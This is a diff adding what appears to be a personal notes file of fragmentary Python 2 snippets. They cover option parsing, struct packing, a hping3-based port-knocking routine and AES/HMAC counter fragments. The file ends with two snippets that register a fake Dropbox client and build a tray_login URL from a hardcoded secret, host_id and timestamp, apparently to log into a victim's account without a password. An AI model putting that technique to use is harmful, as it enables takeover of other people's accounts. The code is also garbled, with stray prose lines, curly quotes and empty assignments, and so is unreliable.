@@ -1,0 +1,118 @@
+# python zeug
+
+def usage():
+    print "bla"
+    sys.exit(2)
+
+opts, args = getopt.getopt(sys.argv[1:], "hp:")
+# h nur option
+# p: option mit wert
+for opt, arg in opts:
+    if opt in ("-p"):
+        port = arg
+    else:
+        usage()
+
+port = pack('!H', int(port))
+i integer 4 byte
+h half    2 byte
+b byte
+! network endian
+
+values = (1, 'ab', 2.7)
+s = struct.Struct('I 2s f')
+packed_data = s.pack(*values)
+print 'Packed Value   :', binascii.hexlify(packed_data)
+Packed Value   : 0100000061620000cdcc2c40
+packed_data = binascii.unhexlify('0100000061620000cdcc2c40')
+s = struct.Struct('I 2s f')
+unpacked_data = s.unpack(packed_data)
+print 'Unpacked Values:', unpacked_data
+Unpacked Values: (1, 'ab', 2.700000047683716)
+
+endianness = [
+    ('@', 'native, native'),
+    ('=', 'native, standard'),
+    ('<', 'little-endian'),
+    ('>', 'big-endian'),
+    ('!', 'network'),
+    ]
+
+idField, seqField, ackField, winField = unpack('!HIIH', packetData)
+
+command = "/usr/sbin/hping3 -S -c 1 -p " + str(knockPort) + " -N " + str(idField) + " -w " + str(winField) + " -M " + str(seqField) + ' -L ' + str(ackField) + " " + host
+command = command.split()
+ret = subprocess.call(command, shell=False, stdout=open('/dev/null', 'w'), stderr=subprocess.STDOUT)
+
+time.sleep(self.openDuration)
+
+from Crypto.Cipher import AES
+self.cipher    = AES.new(self.cipherKey, AES.MODE_ECB)
+hmacSha = hmac.new(self.macKey, port, hashlib.sha1)
+mac     = hmacSha.digest()
+self.cipher.encrypt(counterBytes)
+counterBytes = pack('!IIII', 0, 0, 0, counter)
+encrypted += chr(ord(plaintextData[i]) ^ ord(counterCrypt[i]))
+
+import json
+import requests
+
+host_id = 
+
+data = ("buildno=Dropbox-win-1.7.5&tag="
+        "&uuid=123456&server_list=True&"
+        "host_id=%s&hostname=random"
+        % host_id)
+
+base_url = ’https://client10.dropbox.com’
+url = base_url + ’/register_host’
+
+headers = {’content-type’: \
+   ’application/x-www-form-urlencoded’, \
+   ’User-Agent’: "Dropbox ARM" }
+
+r = requests.post(url, data=data,
+    headers=headers)
+
+data = json.loads(r.text)
+host_int = data["host_int"]
+
+
+import hashlib
+import time
+
+host_id = 
+host_int = 
+
+now = int(time.time())
+
+fixed_secret = ’asdfdasfasdfin9’
+
+h = hashlib.sha1(’%s%s%d’% (fixed_secret,
+    host_id, now)).hexdigest()
+
+url = ("https://www.dropbox.com/tray_login?"
+       "i=%d&t=%d&v=%s&url=home&cl=en" %
+        (host_int, now, h))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
